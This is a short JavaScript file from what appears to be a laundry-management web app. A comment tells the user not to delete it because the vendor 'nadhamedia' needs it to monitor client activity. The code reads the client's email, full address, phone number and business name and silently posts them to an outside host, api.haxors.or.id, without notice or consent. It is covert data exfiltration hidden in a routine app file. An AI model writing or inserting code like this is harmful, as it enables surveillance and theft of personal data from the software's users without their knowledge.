//Workers for nadhamedia 
//NOTE : Dont change or delete this file, because nadhamedia need this file to monitoring client activity
let statusKoneksi = navigator.onLine;

if(statusKoneksi === true){
    $.post('utility/getWorkers', function(data){
        let obj = JSON.parse(data);
        let email = obj.email;
        let alamat = obj.alamatLaundry+", "+obj.kotaLaundry+", "+obj.kabupatenLaundry+", "+obj.provinsiLaundry;
        let hp = obj.hp;
        let nama = obj.namaLaundry;
                // console.log(obj);
        $.post('http://api.haxors.or.id/haxors-product/workers/getInfo.php',{'email':email,'alamat':alamat,'hp':hp,'nama':nama}, function(data){});
    
    });
    
}else{

}

